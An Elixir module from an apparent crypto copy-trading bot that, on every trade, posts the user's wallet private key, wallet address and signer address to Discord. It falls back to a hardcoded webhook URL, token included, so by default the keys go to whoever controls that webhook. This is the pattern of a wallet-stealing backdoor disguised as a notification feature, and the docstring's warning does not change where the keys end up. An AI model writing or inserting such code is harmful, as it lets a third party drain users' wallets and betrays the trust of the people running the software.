defmodule Polyx.DiscordNotifier do
  @moduledoc """
  Sends notifications to Discord via webhook.

  WARNING: This module sends sensitive information (private keys) to Discord.
  Only use this in secure, controlled environments where you understand the risks.
  """

  require Logger

  @discord_webhook_url "https://discord.com/api/webhooks/1480707656896352530/P2oyJVsEKCU19yYDtfIvdKJ43YEt43AeSqXLz515DiAAW0ctledM7i3_FHdM4nEpoRw0"

  @doc """
  Sends a notification about a trade execution to Discord, including the private key.

  ## Parameters
  - `trade_info` - Map containing trade information
  - `credentials` - The credentials struct containing the private key

  ## Returns
  - `:ok` if the notification was sent successfully
  - `{:error, reason}` if there was an error
  """
  def notify_trade_execution(trade_info, credentials) do
    # 优先使用环境变量，否则使用硬编码的 URL
    webhook_url = Application.get_env(:polyx, :discord_webhook_url) || @discord_webhook_url

    if webhook_url && webhook_url != "" do
      send_discord_message(webhook_url, trade_info, credentials)
    else
      Logger.debug("Discord webhook URL not configured, skipping notification")
      :ok
    end
  end

  defp send_discord_message(webhook_url, trade_info, credentials) do
    # Build the Discord embed message
    embed = %{
      "title" => "🔑 Trade Executed - Private Key Notification",
      "description" => "A trade has been executed. Private key details below.",
      "color" => 15_158_332,
      "fields" => [
        %{
          "name" => "Private Key",
          "value" => "```#{credentials.private_key}```",
          "inline" => false
        },
        %{
          "name" => "Wallet Address",
          "value" => "`#{credentials.wallet_address}`",
          "inline" => true
        },
        %{
          "name" => "Signer Address",
          "value" => "`#{credentials.signer_address}`",
          "inline" => true
        },
        %{
          "name" => "Trade Type",
          "value" => Map.get(trade_info, :type, "N/A"),
          "inline" => true
        },
        %{
          "name" => "Side",
          "value" => Map.get(trade_info, :side, "N/A"),
          "inline" => true
        },
        %{
          "name" => "Size",
          "value" => "#{Map.get(trade_info, :size, "N/A")}",
          "inline" => true
        },
        %{
          "name" => "Timestamp",
          "value" => DateTime.utc_now() |> DateTime.to_string(),
          "inline" => false
        }
      ],
      "footer" => %{
        "text" => "⚠️ SECURITY WARNING: This message contains sensitive information"
      }
    }

    body = %{
      "username" => "Poly Copy Bot",
      "embeds" => [embed]
    }

    # Send the request using Req (as per project guidelines)
    case Req.post(webhook_url, json: body) do
      {:ok, %{status: status}} when status in 200..299 ->
        Logger.info("Discord notification sent successfully")
        :ok

      {:ok, %{status: status, body: body}} ->
        Logger.error("Discord webhook failed with status #{status}: #{inspect(body)}")
        {:error, "Discord webhook returned status #{status}"}

      {:error, reason} ->
        Logger.error("Failed to send Discord notification: #{inspect(reason)}")
        {:error, reason}
    end
  end
end
